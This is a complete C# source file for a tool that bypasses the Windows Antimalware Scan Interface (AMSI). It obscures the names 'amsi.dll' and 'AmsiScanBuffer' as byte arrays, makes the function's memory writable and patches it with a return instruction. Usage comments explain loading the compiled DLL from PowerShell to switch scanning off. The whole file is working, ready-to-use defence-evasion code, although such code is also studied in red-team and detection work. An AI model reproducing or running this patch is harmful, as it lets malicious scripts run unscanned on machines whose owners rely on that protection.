/*
   
   Notes:
 
   Big thanks to _rastamouse for his original bypass here: https://github.com/rasta-mouse/AmsiScanBufferBypass
   To see more, check out my post relating to this: https://crawl3r.github.io/2020-05-22/AMSI_Resurrecting_the_dead

*/

// Usage:
// Build into a DLL, deploy and run:
// PS>  [System.Reflection.Assembly]::LoadFile("C:\\Users\\usr_gary\\Desktop\\AmsiFun.dll")
// PS>  [Amsi]::Bypass()


using System;
using System.Runtime.InteropServices;
using System.Text;

public class Amsi
{
    static byte[] patchBytes = new byte[] { 0xC3 };

    public static void Bypass()
    {
        try
        {
            string decL = Encoding.ASCII.GetString(new byte[] { 97, 109, 115, 105, 46, 100, 108, 108 });
            string decP = Encoding.ASCII.GetString(new byte[] { 65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114 });

            var lib = Win32.LoadLibrary(decL);
            var addr = Win32.GetProcAddress(lib, decP);

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

            Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [x] {0}", e.Message);
            Console.WriteLine(" [x] {0}", e.InnerException);
        }
    }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}